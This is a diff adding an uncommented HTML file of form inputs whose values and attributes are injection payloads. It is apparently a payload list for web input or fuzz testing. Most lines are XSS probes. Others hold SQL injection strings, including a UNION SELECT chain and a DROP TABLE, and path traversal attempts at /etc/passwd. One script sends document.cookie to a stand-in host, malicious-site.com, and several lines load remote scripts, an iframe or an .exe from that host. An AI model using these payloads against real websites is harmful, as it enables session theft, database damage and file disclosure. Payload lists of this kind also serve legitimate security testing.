@@ -1,0 +1,55 @@
+<input type="text" value="default">
+<input type="text" value="default" onfocus="alert('XSS')">
+<input type="text" value="default" onmouseover="alert('XSS')">
+<input type="text" value="default" oninput="alert('XSS')">
+<input type="text" value="default" onchange="alert('XSS')">
+<textarea>default</textarea>
+<textarea onfocus="alert('XSS')">default</textarea>
+<textarea onmouseover="alert('XSS')">default</textarea>
+<textarea oninput="alert('XSS')">default</textarea>
+<textarea onchange="alert('XSS')">default</textarea>
+<select><option value="default">Option</option></select>
+<select onchange="alert('XSS')"><option value="default">Option</option></select>
+<button onclick="alert('XSS')">Click me</button>
+<button onmouseover="alert('XSS')">Hover me</button>
+<button onfocus="alert('XSS')">Focus me</button>
+<input type="text" value="<script>alert('XSS')</script>">
+<input type="text" value="<img src=x onerror=alert('XSS')>">
+<input type="text" value="%27%3B DROP TABLE users--">
+<input type="text" value="../../../../../etc/passwd">
+<input type="text" value="../../../../etc/passwd%00">
+<input type="text" value="../../../etc/passwd%00.jpg">
+<input type="text" value="<script>alert('XSS')</script>">
+<input type="text" value="<img src=x onerror=alert('XSS')>">
+<input type="text" value="1 OR 1=1">
+<input type="text" value="1' OR '1'='1">
+<input type="text" value="admin' --">
+<input type="text" value="admin' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --">
+<input type="text" value="<svg/onload=alert('XSS')>">
+<input type="text" value="<a href='javascript:alert('XSS')'>Click me</a>">
+<input type="text" value="%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E">
+<input type="text" value="<iframe src='javascript:alert('XSS')'>">
+<input type="text" value="<body onload=alert('XSS')>">
+<input type="text" value="<input type='image' src='x' onerror='alert('XSS')'>">
+<input type="text" value="<div style='background:url(javascript:alert('XSS'))'>">
+<input type="text" value="<script>fetch('https://malicious-site.com/collect?cookie='+document.cookie)</script>">
+<input type="text" value="<body onload=alert('XSS')>">
+<input type="text" value="<img src=x onerror=alert('XSS')>">
+<input type="text" value="<svg/onload=alert('XSS')>">
+<input type="text" value="<a href='javascript:alert('XSS')'>Click me</a>">
+<input type="text" value="<input type='text' onfocus=alert('XSS')>">
+<input type="text" value="<script src='https://malicious-site.com/malicious-script.js'></script>">
+<input type="text" value="%22%3E%3Cimg src=x onerror=alert('XSS')%3E">
+<input type="text" value="<script async src='https://malicious-site.com/malicious-script.js'></script>">
+<input type="text" value="<marquee onstart=alert('XSS')>Hello</marquee>">
+<input type="text" value="<style>body:after {content: 'XSS'}</style>">
+<input type="text" value="<base href='javascript:alert('XSS')'>">//">
+<input type="text" value="<a onmouseover=alert('XSS')>Hover me</a>">
+<input type="text" value="<img src=x onmouseover=alert('XSS')>">
+<input type="text" value="<input type='text' onmouseover=alert('XSS')>">
+<input type="text" value="<style>*{color: red;}</style><svg/onload=alert('XSS')>">
+<input type="text" value="<audio src=x onerror=alert('XSS')>">
+<input type="text" value="<iframe src='https://malicious-site.com/malicious-page'>">
+<input type="text" value="<div onclick=alert('XSS')>Click me</div>">
+<input type="text" value="<embed src='https://malicious-site.com/malicious-file.exe'>">
+<input type="text" value="<a href='https://malicious-site.com'//onclick=alert('XSS')>Click me</a>">
